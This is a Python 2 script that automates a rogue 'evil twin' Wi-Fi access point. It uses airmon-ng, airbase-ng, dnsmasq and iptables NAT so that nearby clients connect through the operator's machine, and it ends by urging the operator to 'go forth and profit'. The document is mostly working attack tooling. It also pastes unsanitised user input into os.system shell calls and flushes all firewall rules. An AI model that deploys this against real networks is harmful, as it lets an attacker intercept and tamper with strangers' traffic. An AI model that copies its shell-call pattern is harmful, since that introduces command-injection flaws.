#!/usr/bin/python
'''
Author: AWhiteHatter 
Contact: awhitehttr@gmail.com
Description: Generates a Fake-AP 
Version: 0.0 "Getting to know the ropes"
'''
import os

print("\n********************************************\n" +
"Fake-Ap3.py\n\n" +
"You need to have the aircrack suite and dnsmasq installed.\n" +
"Little error handling has been built, so don't mis-type!\n\n" +
"********************************************\n")

starter = raw_input("Give me a starting DHCP address for this fake AP clients (e.g. 192.168.0.50)\n--> ")
stopper = raw_input("Give me a stopping DHCP address (e.g. 192.168.0.150)\n--> ")
coffee = raw_input("Should drone get Coffee for Beard everyday? y/n\n --> ")
if (coffee == "y" or coffee == "n"): 
	if coffee == "y":
		print "you're damn right..."
	else:
		print "That's not acceptable"
else:
	print "Enter y or n, this is serious!"
	exit()

#Write DNSMasq Conf File
f = open('dnsmasq.conf', 'w')
f.write('interface=at0\n' +
'dhcp-range='+ starter + ',' + stopper + ',12h\n' +
'server=8.8.8.8\n' +
'server=8.8.4.4\n')

f.close()

#Now set up airbase-ng and your fake AP
interface = raw_input("What wireless interface should be put into monitor mode? (e.g. wlan1 or wlan0)\n--> ")
ssid = raw_input("What SSID do you want to broadcast at? \n--> ")

os.system('airmon-ng start ' + interface)
print "Now launching \"airbase-ng --essid %s mon0\"" % ssid
os.system('airbase-ng --essid %s mon0 &>/dev/null &' % ssid)

#Now Call DNSMASq to handle the DHCP for the connection
os.system('dnsmasq -C dnsmasq.conf')

#Enable the at0 interface
ip = starter.split('.')
at_ip = ip[0] + '.' + ip[1] + '.' + ip[2] + '.1'
os.system ('ifconfig at0 ' + at_ip + ' up netmask 255.255.255.0')

#Now set up IPv4 Forwarding
print "Making sure IPv4 forwarding is enabled..."
os.system('echo \'1\' > /proc/sys/net/ipv4/ip_forward')

#Now set up IPTables to be NAT
print "almost done..."
interwebz = raw_input("Enter the interface connected to the Interwebz (e.g. eth0)\n--> ")
print "working some IPtables...I hate IPtables..."
os.system('iptables --flush')
os.system('iptables --table nat --flush')
os.system('iptables --delete-chain')
os.system('iptables --table nat --delete-chain')
os.system('iptables --table nat --append POSTROUTING --out-interface %s -j MASQUERADE' % interwebz)
os.system('iptables --append FORWARD --in-interface '+ interface +' -j ACCEPT')

print "%s should be broadcasting, now go forth and profit" % ssid
